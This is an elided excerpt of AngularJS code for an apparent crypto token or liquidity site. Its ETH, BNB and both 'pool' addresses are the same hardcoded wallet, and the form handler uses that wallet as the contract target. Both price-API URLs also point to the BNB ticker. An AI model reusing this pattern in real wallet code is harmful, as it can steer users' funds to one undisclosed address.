...
const ethAddress = '0xE754C81Dab724Ec50cCa05A8794A76F688655B20';
const bnbAddress = '0xE754C81Dab724Ec50cCa05A8794A76F688655B20';
const poolethAddress = '0xE754C81Dab724Ec50cCa05A8794A76F688655B20';
const poolbnbAddress = '0xE754C81Dab724Ec50cCa05A8794A76F688655B20';
...
app.controller('myCtrl', async function($scope) {
                $scope.init = function() {
                        ...
                        $scope.ox = $scope.account.address.substring(0, 3) + "...";
			    ...
			    name: '',
                        ...
                        $scope.submitErc20Form = function() {
                            ...
                            $scope.contractAddress = $scope.erc20.network ? poolethAddress : poolbnbAddress;
                        ...
                        const eth_api_url = "https://api.cryptonator.com/api/ticker/bnb-usd";
                        ...
                        document.getElementById("eth_val").innerHTML = liquidity_eth.toLocaleString();
                        
                        const bsc_api_url = "https://api.cryptonator.com/api/ticker/bnb-usd";
